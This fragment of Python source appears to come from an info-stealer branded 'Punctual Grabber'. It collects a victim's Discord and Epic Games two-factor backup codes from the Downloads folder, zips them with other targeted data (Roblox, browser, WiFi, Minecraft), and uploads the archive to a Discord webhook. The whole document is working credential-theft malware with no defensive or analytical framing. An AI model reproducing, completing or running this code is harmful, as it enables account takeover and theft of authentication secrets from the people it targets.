...
def main(webhook: str):
    ...
    data = {
        "username": "Punctual",
        "avatar_url": "https://media.discordapp.net/attachments/1197025011056259172/1198140324770484305/punctual_fn_pfp.png"
    }

    _file = f'{localappdata}\\Punctual-Logged-{os.getlogin()}.zip'
    ...
    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes"]):
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Punctual-Logged-{os.getlogin()}.zip', file, 'application/zip')})
...
def zipup():
    _zipfile = os.path.join(localappdata, f'Punctual-Logged-{os.getlogin()}.zip')
            ...
            "embeds": [
                {
                    ...
                    "footer": {
                        "text": "Punctual Grabber | Created By factualnoobz"
                    },
                    "thumbnail": {
                        "url": "https://media.discordapp.net/attachments/1197025011056259172/1198140324770484305/punctual_fn_pfp.png"
                    }
                }
            ],
            "username": "Punctual",
...
class BackupCodes:
    def __init__(self):
        ...
        self.epic_code_path = '\\Downloads\\Epic Games Account Two-Factor backup codes.txt'
        self.get_codes()
    ...
    def get_codes(self):
        if os.path.exists(self.path + self.discord_code_path):
            ...
            with open(os.path.join(temp_path, "Discord", "2FA Backup Codes.txt"), "w", encoding="utf-8", errors='ignore') as f:
                with open(self.path + self.discord_code_path, 'r') as g:
                    for line in g.readlines():
                        if line.startswith("*"):
                            f.write(line)
            f.close()

        if os.path.exists(self.path + self.epic_code_path):
            os.makedirs(os.path.join(temp_path, "Epic Games"), exist_ok=True)
            with open(os.path.join(temp_path, "Epic Games", "2FA Backup Codes.txt"), "w", encoding="utf-8", errors='ignore') as f:
                with open(self.path + self.epic_code_path, 'r') as g:
                    for line in g.readlines():
                        code = line.strip()
                        f.write(f"{code}\n")
            f.close()
